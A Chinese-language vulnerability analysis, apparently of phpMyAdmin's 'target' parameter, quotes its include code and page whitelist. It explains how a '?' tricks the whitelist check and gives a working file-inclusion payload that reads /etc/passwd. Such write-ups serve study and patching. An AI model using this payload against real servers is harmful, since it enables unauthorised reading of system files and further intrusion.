# include

全局搜索文件包含的关键函数include,require,找到能控制的传参
```
if (! empty($_REQUEST['target'])
    && is_string($_REQUEST['target'])
    && ! preg_match('/^index/', $_REQUEST['target'])
    && ! in_array($_REQUEST['target'], $target_blacklist)
    && Core::checkPageValidity($_REQUEST['target'])
) {
    include $_REQUEST['target'];
    exit;
}
```

找到黑名单target_blacklist
```
$target_blacklist = array (
    'import.php', 'export.php'
);
```
绕过须满足条件,
1.有参数传入
2.参数为字符
3.参数中不能以/^index/开头(这里没由匹配大小写)
4.参数不在黑名单内
5.绕过Core::checkPageValidity(全局搜索)
```
public static function checkPageValidity(&$page, array $whitelist = [])
    {
        if (empty($whitelist)) {
            $whitelist = self::$goto_whitelist;
        }
        if (! isset($page) || !is_string($page)) {
            return false;
        }

        if (in_array($page, $whitelist)) {
            return true;
        }

        $_page = mb_substr(
            $page,
            0,
            mb_strpos($page . '?', '?')
        );
        if (in_array($_page, $whitelist)) {
            return true;
        }

        $_page = urldecode($page);
        $_page = mb_substr(
            $_page,
            0,
            mb_strpos($_page . '?', '?')
        );
        if (in_array($_page, $whitelist)) {
            return true;
        }

        return false;
    }
```
这里原本函数没有设置白名单,与是自动引入白名单,全局搜索goto_whitelist
```
public static $goto_whitelist = array(
        'db_datadict.php',
        'db_sql.php',
        'db_events.php',
        'db_export.php',
        'db_importdocsql.php',
        'db_multi_table_query.php',
        'db_structure.php',
        'db_import.php',
        'db_operations.php',
        'db_search.php',
        'db_routines.php',
        'export.php',
        'import.php',
        'index.php',
        'pdf_pages.php',
        'pdf_schema.php',
        'server_binlog.php',
        'server_collations.php',
        'server_databases.php',
        'server_engines.php',
        'server_export.php',
        'server_import.php',
        'server_privileges.php',
        'server_sql.php',
        'server_status.php',
        'server_status_advisor.php',
        'server_status_monitor.php',
        'server_status_queries.php',
        'server_status_variables.php',
        'server_variables.php',
        'sql.php',
        'tbl_addfield.php',
        'tbl_change.php',
        'tbl_create.php',
        'tbl_import.php',
        'tbl_indexes.php',
        'tbl_sql.php',
        'tbl_export.php',
        'tbl_operations.php',
        'tbl_structure.php',
        'tbl_relation.php',
        'tbl_replace.php',
        'tbl_row_action.php',
        'tbl_select.php',
        'tbl_zoom_select.php',
        'transformation_overview.php',
        'transformation_wrapper.php',
        'user_password.php',
    );
```

这里的绕过思路基于mb_substr,mb_strpos,且进行了两次
 mb_strpos($_page . '?', '?')  的作用是：在字符串  $_page  的末尾追加一个问号  ? ，然后查找第一个问号  ?  的位置。这个操作通常用于 判断 URL 中是否存在查询参数（即  ?  后的部分），并安全地分割路径和参数。
 
构造payload:
?target=sql.php?
例子:target=sql.php?../../../etc/passwd
解析payload:
这里mbstrpos将取得sql.php后的?位置,导致取得的$_page为sql.php,满足条件成功让函数返回ture,回到include处,成功绕过所有条件,完成include函数的执行
这里也可以将?进行两次url编码,绕过下面的.

